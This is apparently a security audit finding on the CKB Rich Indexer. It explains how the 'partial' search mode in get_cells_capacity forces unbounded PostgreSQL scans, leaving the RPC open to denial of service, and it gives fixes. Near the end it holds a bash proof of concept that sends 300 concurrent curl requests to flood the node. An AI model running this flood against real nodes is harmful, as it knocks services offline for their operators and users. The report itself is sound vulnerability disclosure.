### Title
Unbounded Full-Table Scan via `partial` Search Mode in Rich Indexer RPC Causes Denial of Service Against PostgreSQL Backend — (`File: util/rich-indexer/src/indexer_handle/async_indexer_handle/get_cells_capacity.rs`)

---

### Summary

The CKB Rich Indexer's `get_cells_capacity` RPC endpoint (and `get_cells` / `get_transactions` to a lesser degree) accepts a caller-controlled `script_search_mode: "partial"` parameter. When the PostgreSQL backend is active, this mode generates a leading-wildcard `LIKE '%<user_data>%'` query that cannot use B-tree indexes and forces a full sequential scan of the `script` and `output` tables. Because `get_cells_capacity` has no `limit` parameter, must aggregate `SUM(capacity)` over every matching row, and the `request_limit` defaults to `usize::MAX` with no per-request rate limiting, an unauthenticated RPC caller can flood the node with concurrent requests that each hold a long-running PostgreSQL transaction, exhausting the database connection pool, CPU, and I/O — causing a denial of service for all other RPC consumers.

---

### Finding Description

**Entry point:** The `RichIndexer` RPC module, enabled with `--rich-indexer` and a PostgreSQL backend, exposes `get_cells_capacity(search_key)` at `rpc/src/module/rich_indexer.rs`.

**Step 1 — Partial mode generates a non-indexable LIKE pattern.**

`build_query_script_id_sql` in `util/rich-indexer/src/indexer_handle/async_indexer_handle/mod.rs` (lines 145–155) emits:

```sql
args LIKE $N
```

The bound value is produced by `escape_and_wrap_for_postgres_like` (lines 339–360 of the same file), which wraps the caller-supplied `args` bytes with `%` on both sides:

```
%<user_data>%
```

A leading-wildcard `LIKE` pattern is non-sargable in PostgreSQL — no B-tree index on `script.args` can be used, so the planner falls back to a sequential scan of the entire `script` table.

**Step 2 — `get_cells_capacity` has no row limit.**

Unlike `get_cells` and `get_transactions`, which at least check `limit` against `request_limit`, `get_cells_capacity` (`util/rich-indexer/src/indexer_handle/async_indexer_handle/get_cells_capacity.rs`, line 27) issues:

```sql
SELECT CAST(SUM(output.capacity) AS BIGINT) AS total_capacity FROM output ...
```

There is no `LIMIT` clause. The query must scan and aggregate every matching row in the `output` table before returning.

**Step 3 — `request_limit` defaults to unlimited.**

`RichIndexerService::new` in `util/rich-indexer/src/service.rs` (line 51):

```rust
request_limit: config.request_limit.unwrap_or(usize::MAX),
```

The `request_limit` configuration key is commented out in the default `ckb.toml` (lines 286–291), so unless the operator explicitly sets it, it is `usize::MAX`.

**Step 4 — No per-request rate limiting on the RPC layer.**

`rpc/src/server.rs` implements `handle_jsonrpc`. The only batch-level guard is `JSONRPC_BATCH_LIMIT`, which is also disabled by default (commented out in `resource/ckb.toml`, lines 205–208). There is no per-method or per-IP rate limiter for the `RichIndexer` module. The hole-punching protocol has its own `governor`-based rate limiter, but no equivalent exists for RPC endpoints.

**Resulting query (PostgreSQL, partial mode, no filter):**

```sql
SELECT CAST(SUM(output.capacity) AS BIGINT) AS total_capacity
FROM output
JOIN (
  SELECT script.id FROM script
  WHERE code_hash = $1
    AND hash_type = $2
    AND args LIKE $3          -- $3 = '%\x41%' (single-byte pattern)
) AS query_script ON output.lock_script_id = query_script.id
WHERE output.is_spent = 0;
```

On a mainnet-scale database with tens of millions of outputs, this query can run for many seconds per invocation.

---

### Impact Explanation

An RPC caller sends a high volume of concurrent `get_cells_capacity` requests with `script_search_mode: "partial"` and a minimal 1-byte `args` value. Each request:

1. Opens a PostgreSQL transaction.
2. Executes a full sequential scan of `script` (non-indexable `LIKE '%x%'`).
3. Joins and aggregates all matching rows in `output` with no row limit.
4. Holds the connection for the duration of the scan.

Stacking hundreds of such requests saturates the PostgreSQL connection pool, pins CPU at 100%, and starves I/O. All other RPC methods that touch the Rich Indexer database — including legitimate `get_cells`, `get_transactions`, and `get_indexer_tip` calls — time out or queue indefinitely. The CKB node's RPC service becomes unresponsive for the duration of the attack.

**Impact: High** — complete denial of the Rich Indexer RPC surface; potential spillover to the node's overall RPC responsiveness depending on shared thread pool configuration.

---

### Likelihood Explanation

**Likelihood: Medium-High.**

- The `RichIndexer` module is an opt-in feature (`--rich-indexer`), but it is the recommended path for dApp developers and block explorers that need flexible cell queries.
- The PostgreSQL backend is explicitly documented and recommended for production deployments.
- The `partial` search mode is a documented, advertised feature of the Rich Indexer (README, RPC docs).
- No authentication is required for RPC calls; by default the RPC binds to `127.0.0.1`, but operators commonly expose it to internal networks or proxy it publicly.
- The attack requires only standard JSON-RPC POST requests — no special privileges, no keys, no P2P access.
- `request_limit` and `rpc_batch_limit` are both disabled by default, leaving no server-side throttle.

---

### Recommendation

1. **Add a per-request timeout for Rich Indexer database queries.** The config already documents a `timeout_limit` option (commented out in `ckb.toml`, line 293); enforce it as a hard default (e.g., 10 seconds) rather than opt-in.

2. **Set a safe default for `request_limit`.** Change `config.request_limit.unwrap_or(usize::MAX)` in `util/rich-indexer/src/service.rs` line 51 to a bounded default (e.g., `400`, as the comment on line 291 of `ckb.toml` already recommends).

3. **Enable `rpc_batch_limit` by default.** The config comment at `resource/ckb.toml` lines 205–208 already recommends `2000`; make this the compiled-in default rather than opt-in.

4. **Add a per-IP or per-connection rate limiter for the RichIndexer RPC module**, analogous to the `governor`-based `forward_rate_limiter` already used in `network/src/protocols/hole_punching/mod.rs` (lines 31–46).

5. **Consider adding a PostgreSQL query statement timeout** (`SET statement_timeout = '10s'`) at the connection level in `SQLXPool` so that runaway scans are killed by the database itself regardless of application-level controls.

---

### Proof of Concept

```bash
# Requires: CKB node running with --rich-indexer and PostgreSQL backend
# Sends 300 concurrent get_cells_capacity requests with partial search mode
# Each triggers a full sequential scan of the script+output tables

for i in $(seq 1 300); do
  curl -s -X POST http://127.0.0.1:8114 \
    -H 'Content-Type: application/json' \
    -d '{
      "id": '"$i"',
      "jsonrpc": "2.0",
      "method": "get_cells_capacity",
      "params": [{
        "script": {
          "code_hash": "0x0000000000000000000000000000000000000000000000000000000000000000",
          "hash_type": "data",
          "args": "0x41"
        },
        "script_type": "lock",
        "script_search_mode": "partial"
      }]
    }' &
done
wait
```

The `args: "0x41"` (single byte `A`) causes `escape_and_wrap_for_postgres_like` to produce the pattern `%A%`, which matches a large fraction of all script rows and forces a full table scan. With 300 concurrent requests and no rate limit or timeout, PostgreSQL connection slots are exhausted and subsequent RPC calls (including `get_cells`, `get_transactions`, and unrelated chain RPC methods sharing the same process) stall or return errors.

**Relevant code locations:**

- `escape_and_wrap_for_postgres_like` producing `%data%`: [1](#0-0) 

- `build_query_script_id_sql` emitting `args LIKE $N` for Postgres partial mode: [2](#0-1) 

- `get_cells_capacity` issuing an unbounded `SUM` aggregate with no `LIMIT`: [3](#0-2) 

- `request_limit` defaulting to `usize::MAX`: [4](#0-3) 

- `rpc_batch_limit` disabled by default (commented out): [5](#0-4) 

- No rate limiter in the RichIndexer RPC dispatch path: [6](#0-5)

### Citations

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/mod.rs (L145-155)
```rust
        Some(IndexerSearchMode::Partial) => {
            match db_driver {
                DBDriver::Postgres => {
                    query_builder.and_where(format!("args LIKE ${}", param_index));
                }
                DBDriver::Sqlite => {
                    query_builder.and_where(format!("instr(args, ${}) > 0", param_index));
                }
            }
            *param_index += 1;
        }
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/mod.rs (L339-360)
```rust
fn escape_and_wrap_for_postgres_like(data: &JsonBytes) -> Vec<u8> {
    // 0x5c is the default escape character '\'
    // 0x25 is the '%' wildcard
    // 0x5f is the '_' wildcard

    let mut new_data: Vec<u8> = data
        .as_bytes()
        .iter()
        .flat_map(|&b| {
            if b == 0x25 || b == 0x5c || b == 0x5f {
                vec![0x5c, b]
            } else {
                vec![b]
            }
        })
        .collect();

    new_data.insert(0, 0x25); // Start with %
    new_data.push(0x25); // End with %

    new_data
}
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/get_cells_capacity.rs (L26-27)
```rust
        let mut query_builder = SqlBuilder::select_from("output");
        query_builder.field("CAST(SUM(output.capacity) AS BIGINT) AS total_capacity");
```

**File:** util/rich-indexer/src/service.rs (L51-51)
```rust
            request_limit: config.request_limit.unwrap_or(usize::MAX),
```

**File:** resource/ckb.toml (L205-208)
```text
# By default, there is no limitation on the size of batch request size
# a huge batch request may cost a lot of memory or makes the RPC server slow,
# to avoid this, you may want to add a limit for the batch request size.
# rpc_batch_limit = 2000
```

**File:** rpc/src/module/rich_indexer.rs (L206-214)
```rust
    async fn get_cells_capacity(
        &self,
        search_key: IndexerSearchKey,
    ) -> Result<Option<IndexerCellsCapacity>> {
        self.handle
            .get_cells_capacity(search_key)
            .await
            .map_err(|e| RPCError::custom(RPCError::Indexer, e))
    }
```
